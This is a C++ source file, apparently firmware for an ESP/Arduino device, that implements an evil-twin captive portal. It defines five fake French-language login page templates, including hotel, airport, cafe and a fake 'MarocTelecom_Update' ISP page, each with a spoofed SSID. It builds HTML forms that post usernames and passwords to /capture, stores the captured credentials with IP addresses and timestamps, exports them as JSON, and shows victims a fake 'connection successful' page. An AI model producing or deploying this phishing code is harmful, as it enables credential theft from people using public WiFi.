#include "hardware.h"
#include "captive_portal.h"
#include <ArduinoJson.h>

CapturedCred capturedCreds[MAX_CAPTURED_CREDS];
int capturedCount = 0;
bool portalActive = false;

PortalStyle portalStyles[] = {
  {"wifi_login", "WiFi Login",         "Connectez-vous au reseau",  "\xF0\x9F\x93\xB6", "#2563eb", "linear-gradient(135deg,#1e40af,#3b82f6)", "Email / Telephone", "Mot de passe", "WiFi-Free"},
  {"hotel",      "Hotel WiFi",         "Acces Internet",            "\xF0\x9F\x8F\xA8", "#059669", "linear-gradient(135deg,#065f46,#10b981)", "Numero de chambre", "Nom complet", "Hotel_WiFi"},
  {"isp_update", "Mise a jour operateur","Configuration requise",   "\xF0\x9F\x94\xA7", "#d97706", "linear-gradient(135deg,#92400e,#f59e0b)", "Identifiant", "Mot de passe", "MarocTelecom_Update"},
  {"airport",    "Aeroport WiFi",      "Connexion gratuite",        "\xE2\x9C\x88\xEF\xB8\x8F", "#7c3aed", "linear-gradient(135deg,#5b21b6,#8b5cf6)", "Email", "Numero de vol", "Airport_Free"},
  {"cafe",       "Cafe WiFi",          "Connexion gratuite",        "\xE2\x98\x95", "#ea580c", "linear-gradient(135deg,#9a3412,#f97316)", "Email", "Telephone", "Cafe_Free"}
};
const int NUM_PORTAL_STYLES = 5;

void initCaptivePortal() {
  capturedCount = 0;
  portalActive = false;
}

void startCaptivePortal(int templateIdx, const char* customSSID) {
  if (templateIdx < 0 || templateIdx >= NUM_PORTAL_STYLES) templateIdx = 0;
  portalActive = true;
  capturedCount = 0;
}

void stopCaptivePortal() {
  portalActive = false;
}

void clearCreds() {
  capturedCount = 0;
}

String getPortalStatusJSON() {
  JsonDocument doc;
  doc["active"] = portalActive;
  doc["captured"] = capturedCount;
  String out;
  serializeJson(doc, out);
  return out;
}

String getPortalCredsJSON() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (int i = 0; i < capturedCount; i++) {
    JsonObject obj = arr.add<JsonObject>();
    obj["user"] = capturedCreds[i].username;
    obj["pass"] = capturedCreds[i].password;
    obj["ip"] = capturedCreds[i].ip;
    obj["ts"] = capturedCreds[i].timestamp;
  }
  String out;
  serializeJson(doc, out);
  return out;
}

String getPortalTemplatesJSON() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (int i = 0; i < NUM_PORTAL_STYLES; i++) {
    JsonObject obj = arr.add<JsonObject>();
    obj["id"] = portalStyles[i].id;
    obj["title"] = portalStyles[i].title;
  }
  String out;
  serializeJson(doc, out);
  return out;
}

String generatePortalHTML(int templateIdx) {
  if (templateIdx < 0 || templateIdx >= NUM_PORTAL_STYLES) templateIdx = 0;
  PortalStyle &s = portalStyles[templateIdx];
  String html = "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>";
  html += "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:";
  html += s.bgGradient;
  html += "}.card{background:#fff;border-radius:16px;padding:2rem;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.2)}.icon{font-size:3rem;margin-bottom:.5rem}h2{color:#1d1d1f;margin-bottom:.2rem;font-size:1.3rem}p{color:#6e6e73;font-size:.9rem;margin-bottom:1.5rem}input{width:100%;padding:.8rem;border:1px solid #d1d5db;border-radius:10px;font-size:.95rem;margin-bottom:.6rem;outline:none}input:focus{border-color:";
  html += s.primaryColor;
  html += "}button{width:100%;padding:.8rem;background:";
  html += s.primaryColor;
  html += ";color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer}</style></head><body><div class=card><div class=icon>";
  html += s.icon;
  html += "</div><h2>";
  html += s.title;
  html += "</h2><p>";
  html += s.subtitle;
  html += "</p><form action=/capture method=POST><input name=username placeholder='";
  html += s.userPlaceholder;
  html += "'><input name=password type=password placeholder='";
  html += s.passPlaceholder;
  html += "'><button type=submit>Se connecter</button></form></div></body></html>";
  return html;
}

String generateSuccessHTML() {
  return "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'><style>body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f5}.msg{text-align:center}h2{color:#16a34a;font-size:1.5rem}p{color:#6e6e73}</style></head><body><div class=msg><h2>\xE2\x9C\x93 Connexion reussie</h2><p>Vous etes maintenant connecte</p></div></body></html>";
}
